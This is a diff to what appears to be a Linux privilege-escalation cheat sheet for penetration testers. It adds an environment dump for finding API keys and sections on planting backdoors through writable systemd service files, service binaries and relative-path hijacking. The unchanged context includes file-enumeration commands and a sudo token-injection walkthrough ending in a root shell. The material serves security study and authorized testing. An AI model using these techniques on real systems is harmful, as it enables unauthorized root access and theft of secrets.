@@ -12,6 +12,10 @@ description: >-
 
 #### `cat /etc/issue  cat /etc/*-release  cat /etc/lsb-release # Debian based  cat /etc/redhat-release # Redhat based`
 
+#### env info, might contain interesting info about system, API keys or command shortcuts:
+
+#### `(env || set) 2>/dev/null`
+
 #### What's the kernel version? Is it 64-bit?
 
 #### `cat /proc/version  uname -a  uname -mrs  cat /proc/$$/status | grep "[UG]id"  rpm -q kernel  dmesg | grep Linux  ls /boot | grep vmlinuz-`
@@ -37,13 +41,13 @@ description: >-
 
 ## sudo\_inject
 
-#### this has requirements, does'nt work all the time:\(
+#### this has requirements, doesn't work all the time:\(
 
 #### clone the repository and run the script: [sudo\_inject](https://github.com/nongiach/sudo_inject)  requirements:
 
 #### `$ sudo whatever  [sudo] password for user:  # Press+c since you don't have the password.  # This creates an invalid sudo tokens.  $ sh exploit.sh  .... wait 1 seconds  $ sudo -i # no password required :)  # id  uid=0(root) gid=0(root) groups=0(root)`
 
-
+\`\`
 
 #### What can be learnt from the environmental variables?
 
@@ -210,7 +214,7 @@ description: >-
 
 
 
-## programs and softwares
+## programs and software
 
 ####   enumerate useful binaries
 
@@ -234,7 +238,25 @@ description: >-
 
 ####  `ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone  ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner  ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group  ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null # Other  find /etc/ -readable -type f 2>/dev/null # Anyone  find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone  ls -alh /var/log  ls -alh /var/mail  ls -alh /var/spool  ls -alh /var/spool/lpd  ls -alh /var/lib/pgsql  ls -alh /var/lib/mysql  cat /var/lib/dhcp3/dhclient.leases  ls -alhR /var/www/  ls -alhR /srv/www/htdocs/  ls -alhR /usr/local/www/apache22/data/  ls -alhR /opt/lampp/htdocs/  ls -alhR /var/www/html/`
 
+## Services <a id="services"></a>
 
+### Writable _.service_ files <a id="writable-service-files"></a>
+
+Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** \(maybe you will need to wait until the machine is rebooted\). For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**
+
+### Writable service binaries <a id="writable-service-binaries"></a>
+
+Keep in mid that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.
+
+### systemd PATH - Relative Paths <a id="systemd-path-relative-paths"></a>
+
+You can see the PATH used by **systemd** with:
+
+#### `systemctl show-environment`
+
+If you find that you can **write** in any of the folders of the path you may be able to **escalate privileges**.You need to search for **relative paths being used on service configurations**
+
+Then, create a **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action \(**Start**, **Stop**, **Reload**\), your **backdoor will be executed** \(unprivileged users usually cannot start/stop services but check if you can using `sudo -l`\).
 
 ## files and directories
 
